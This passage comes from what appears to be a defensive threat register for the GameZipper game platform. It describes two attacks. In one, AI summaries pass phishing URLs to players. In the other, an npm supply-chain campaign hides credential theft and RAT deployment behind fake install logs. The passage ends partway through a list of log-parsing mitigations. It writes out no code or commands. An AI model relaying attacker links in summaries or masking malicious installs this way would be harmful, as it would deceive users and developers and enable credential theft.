summary, and asserts every URL is in a GameZipper-allowlist. **Severity justification**: P1 because the attack requires no compromise, hits every AI-summarizing user, and the phishing URL inherits the AI's trust — player credential theft via a "trusted" AI summary is high-impact and low-detection.

### 34.2 npm "Ghost Campaign" (幽灵行动) — Fake Install-Log Output Masks RAT Deployment Under Plausible npm Progress Bars (Feb 2026)
- [S-121] **[P1]** npm "Ghost campaign" (幽灵行动) — malicious npm packages print fake npm install logs (progress bars, dependency names from a hardcoded list, randomized delays) to disguise credential-harvesting and RAT (remote access trojan) C2 deployment as a normal `npm install`; the deception is sophisticated enough that even experienced developers watching the console cannot distinguish the fake output from a real install (so.html5.qq.com / QQ News March 27 2026 "新型开源供应链攻击:虚假 npm 安装日志暗藏 RAT 木马"; campaign began early February 2026). **Why this is a DECEPTION-OF-DEVELOPER-CONSOLE technique distinct from prior npm cases**: S-104 (IndonesianFoods escalation) is about **credential theft + cloud persistence**; S-105 (Phantom Gyp / Miasma Wave 2) is about **binding.gyp lifecycle-script BYPASS** of postinstall scanners; S-106 (IronWorm) is about **persistence + AI-credential targeting**; S-107 (Red Hat Miasma worm) is about **trusted-vendor-namespace compromise**; S-121 is about **masking malicious runtime activity inside plausible install-output** — the malicious code runs DURING install (like postinstall) but it never prints "malware detected" or an obvious error; instead it streams fake "Downloading foo@1.2.3..." lines while exfiltrating env vars and fetching the RAT payload in parallel. The deception defeats the #1 mitigation recommended for all prior npm cases: "watch the install output for anomalies." **Why this matters for GameZipper**: GameZipper's pipeline runs subagents that execute `npm install` during game builds (the `game-dev-workflow` and puzzle-pipeline skills); a human or subagent eyeballing install logs to spot malicious activity — the recommended mitigation in S-104 step 5 — is DEFEATED by Ghost-campaign-style fake logs. **Test for GameZipper**: (1) **machine-parse ALL npm install output, never eyeball it** — the CI pipeline must capture stdout/stderr of `npm install` and parse it programmatically: (a) every "Downloading"/"Added" line must correspond to a package in `package-lock.json`;
